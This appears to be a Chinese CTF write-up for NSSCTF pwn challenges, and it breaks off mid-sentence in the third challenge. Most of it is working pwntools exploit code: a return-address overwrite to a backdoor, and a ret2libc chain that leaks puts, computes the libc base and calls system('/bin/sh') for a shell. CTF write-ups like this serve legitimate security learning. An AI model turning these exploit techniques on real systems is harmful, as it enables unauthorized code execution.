# Hello_world
签到题，利用栈溢出漏洞劫持返回函数至backdoors即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28485
if local:
	p = process('./Hello_world')
	pwnlib.gdb.attach(p, 'b func1')
else:
	p = remote(ip, port)
	# p = websocket()

payload = b'a' * (0x20 + 8) + b'\xc5'
p.send(payload)
p.interactive()
```
# ret2libc1
菜单题，可以找到栈溢出漏洞在shop函数里
![[Pasted image 20250302221923.png]]
main函数中可以找到当输入7时会执行see_it函数，可以刷钱，刷了钱后便可以买下商店触发栈溢出漏洞。
![[Pasted image 20250302222124.png]]
利用该漏洞可以泄漏libc基址构造rop。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28561
if local:
	p = process('./attachment')
	pwnlib.gdb.attach(p, 'b ')
else:
	p = remote(ip, port)
	# p = websocket()

elf = ELF('./attachment')
libc = ELF('./libc.so.6')

ret = 0x400579
pop_rdi = 0x400d73

p.recvuntil(b'6.check youer money\n')
p.sendline(b'7')
p.recvuntil(b'exchange?')
p.sendline(b'1000')
p.recvuntil(b'6.check youer money\n')
p.sendline(b'5')
p.recvuntil(b'name it!!!\n')

payload = b'a' * (0x40 + 8)
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400b1e)

p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * (0x40 + 8)
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
p.recvuntil(b'name it!!!\n')
p.sendline(payload)

p.interactive()
```

# ret2libc2
one_gadget类型的题目。
需要先想办法泄漏libc基址，因为不能直接控制pop rdi; ret 需要找别的方法。
![[Pasted image 20250302222628.png]]
能想到的方法就是利用printf函数将